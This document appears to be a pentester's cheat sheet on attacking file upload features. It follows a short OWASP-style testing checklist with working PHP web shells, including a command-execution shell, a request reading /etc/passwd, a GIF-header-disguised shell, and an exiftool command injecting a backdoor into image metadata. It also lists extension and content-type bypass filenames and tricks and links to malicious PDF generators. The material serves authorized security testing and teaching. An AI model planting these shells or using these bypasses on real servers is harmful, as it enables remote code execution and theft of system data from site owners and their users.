# File Upload

Tags: File Upload, insecure design

tools: exiftool

### WSTG Testing methodology

- Study the applications logical requirements.
- Prepare a library of files that are “not approved” for upload that may contain files such as: jsp, exe, or HTML files containing script.
- In the application navigate to the file submission or upload mechanism.
- Submit the “not approved” file for upload and verify that they are properly prevented from uploading
- Check if the website only do file type check in client-side JavaScript
- Check if the website only check the file type by “Content-Type” in HTTP request.
- Check if the website only check by the file extension.
- Check if other uploaded files can be accessed directly by specified URL.
- Check if the uploaded file can include code or script injection.
- Check if there is any file path checking for uploaded files.
Especially, hackers may compress files with specified path in ZIP so
that the unzip files can be uploaded to intended path after uploading
and unzip.
- Identify the file upload functionality.
- Review the project documentation to identify what file types are
considered acceptable, and what types would be considered dangerous or
malicious.
    - If documentation is not available then consider what would be appropriate based on the purpose of the application.
- Determine how the uploaded files are processed.
- Obtain or create a set of malicious files for testing.
- Try to upload the malicious files to the application and determine whether it is accepted and processed.

### Dont forget fuck with Web Shells

```
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

```jsx
https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd
```

### and dont forget to fuck with source code s

- Java: `new file`, `import`, `upload`, `getFileName`, `Download`, `getOutputString`
- C/C++: `open`, `fopen`
- PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`

# Bypasses

[https://github.com/sAjibuu/upload_bypass](https://github.com/sAjibuu/upload_bypass)

all you need in this section is performing a FUZZ and look what extention you can upload in web server. → alternative extentions

- `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
- `SVG`: Stored XSS, SSRF, XXE
- `GIF`: Stored XSS, SSRF
- `CSV`: CSV injection
- `XML`: XXE
- `AVI`: LFI, SSRF
- `HTML`, `JS` : HTML injection, XSS, Open redirect
- `PNG`, `JPEG`: Pixel flood attack (DoS)
- `ZIP`: RCE via LFI, DoS
- `PDF`, `PPTX`: SSRF, BLIND XXE , XSS

- Blacklisting Bypass
    - PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
    - ASP → `asp`, `.aspx`, `.cer`, `.asa`
    - Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
    - Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
    - Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
- Whitelisting Bypass
    - `file.jpg.php`
    - `file.php.jpg`
    - `file.php.blah123jpg`
    - `file.php#.jpg`
    - `file.php%00.jpg`
        - `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
    - `file.php%00`
    - `file.php%20`
    - `file.php%0d%0a.jpg`
    - `file.php.....`
    - `file.php/`
    - `file.php.\`
    - `file.php#.png`
    - `file.`
    - `.html`
    
    # Bypass senarios
    
    ### Content-type bypass
    
    - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream`
    to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
    
    ### Content-length bypass
    
    - edit manually and change it to check is server cuase a eroor or not
    - Small PHP Shell like:`(<?=`$_GET[x]`?>)`
    
    ### content-bypass shell
    
    - If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )GIF89a is a GIF file header. If uploaded content is being scanned,
    sometimes the check can be fooled by putting this header item at the top of shellcode:
    
    `GIF89a; <?php system($_GET['cmd']); ?>`
    
    ### Magic Bytes - Numbers Bypass
    
    | File type | Typical extension | Hex digitsxx = variable | Ascii digits. = not an ascii char |
    | --- | --- | --- | --- |
    | Bitmap format | .bmp | 42 4d | BM |
    | FITS format | .fits | 53 49 4d 50 4c 45 | SIMPLE |
    | GIF format | .gif | 47 49 46 38 | GIF8 |
    | Graphics Kernel System | .gks | 47 4b 53 4d | GKSM |
    | IRIS rgb format | .rgb | 01 da | .. |
    | ITC (CMU WM) format | .itc | f1 00 40 bb | .... |
    | JPEG File Interchange Format | .jpg | ff d8 ff e0 | .... |
    | NIFF (Navy TIFF) | .nif | 49 49 4e 31 | IIN1 |
    | PM format | .pm | 56 49 45 57 | VIEW |
    | PNG format | .png | 89 50 4e 47 | .PNG |
    | Postscript format | .[e]ps | 25 21 | %! |
    | Sun Rasterfile | .ras | 59 a6 6a 95 | Y.j. |
    | Targa format | .tga | xx xx xx | ... |
    | TIFF format (Motorola - big endian) | .tif | 4d 4d 00 2a | MM.* |
    | TIFF format (Intel - little endian) | .tif | 49 49 2a 00 | II*. |
    | X11 Bitmap format | .xbm | xx xx |  |
    | XCF Gimp file structure | .xcf | 67 69 6d 70 20 78 63 66 20 76 | gimp xcf |
    | Xfig format | .fig | 23 46 49 47 | #FIG |
    | XPM format | .xpm | 2f 2a 20 58 50 4d 20 2a 2f | /* XPM */ |
    
    ### Tips for Magic Bytes
    
    - in boundery section of request for uploading image delete the half of boundry of image value and insert your payload (shell,javascript,XSS or HTML) and submit the upload
        - then check if upload was success?
    
    for more: [https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/File Upload/README.md](https://github.com/0xmaximus/Galaxy-Bugbounty-Checklist/blob/main/File%20Upload/README.md)
    
    **Challenge #2**
    
    ```
    php2 ... php7
    phtml
    phps
    phar
    inc
    hphp
    
    ```
    
    **Challenge #3**
    
    ```
    PhP
    pHP
    pHp
    
    ```
    
    **Challenge #4/#5**
    
    ```
    my_file.jpg.php
    my_file.php.jpg
    
    ```
    
    **Challenge #6**
    
    1. Change request content type in burp suite intercept
    2. Inject code in image metadata using exiftool
    
    Remove file metadata:
    
    ```
    exiftool -all= pic.php.jpg
    ```
    
    Inject backdoor to image:
    
    ```
    exiftool -artist="<?php system($_GET['i']) ?>" pic.php.jpg
    ```
    
    ### Check for XSS payload During Uploading PDF
    
    you can download payloads from PAYLOADSALLTHEPDFs repo:
    
    [https://github.com/luigigubello/PayloadsAllThePDFs/tree/main](https://github.com/luigigubello/PayloadsAllThePDFs/tree/main)
    
    or use automated tools to generate paylaod:
    
    [https://github.com/jonaslejon/malicious-pdf](https://github.com/jonaslejon/malicious-pdf)
    
    [https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)